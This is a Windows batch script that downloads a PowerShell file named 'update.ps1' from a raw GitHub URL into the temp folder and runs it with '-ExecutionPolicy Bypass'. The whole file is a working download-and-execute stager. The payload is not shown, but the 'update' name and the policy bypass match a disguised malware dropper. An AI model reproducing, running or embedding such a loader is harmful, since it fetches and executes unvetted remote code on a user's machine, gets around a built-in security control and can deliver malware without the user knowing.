@echo off
SET "SCRIPT_URL=https://github.com/swagkarna/test1/raw/refs/heads/main/update.ps1"
SET "SCRIPT_NAME=update.ps1"
SET "DOWNLOAD_DIR=%TEMP%"
SET "SCRIPT_PATH=%DOWNLOAD_DIR%\%SCRIPT_NAME%"

echo ============================================
echo Starting the download and execution of %SCRIPT_NAME%...
echo ============================================
IF NOT EXIST "%DOWNLOAD_DIR%" (
    echo Creating download directory at %DOWNLOAD_DIR%...
    mkdir "%DOWNLOAD_DIR%"
    IF ERRORLEVEL 1 (
        echo Failed to create directory %DOWNLOAD_DIR%.
        EXIT /B 1
    )
)

echo Downloading %SCRIPT_NAME% from %SCRIPT_URL%...
powershell -NoProfile -Command ^
    "try { ^
        Invoke-WebRequest -Uri '%SCRIPT_URL%' -OutFile '%SCRIPT_PATH%' -ErrorAction Stop ^
     } catch { ^
        Write-Error 'Download failed.'; ^
        exit 1 ^
    }"

IF NOT EXIST "%SCRIPT_PATH%" (
    echo Failed to download %SCRIPT_NAME%.
    EXIT /B 1
)

echo Successfully downloaded %SCRIPT_NAME% to %SCRIPT_PATH%.

echo Executing %SCRIPT_NAME%...
powershell -NoProfile -ExecutionPolicy Bypass -File "%SCRIPT_PATH%"

IF %ERRORLEVEL% NEQ 0 (
    echo Execution of %SCRIPT_NAME% failed with exit code %ERRORLEVEL%.
    EXIT /B %ERRORLEVEL%
)

echo %SCRIPT_NAME% executed successfully.

echo ============================================
echo Batch script completed successfully.
echo ============================================

EXIT /B 0
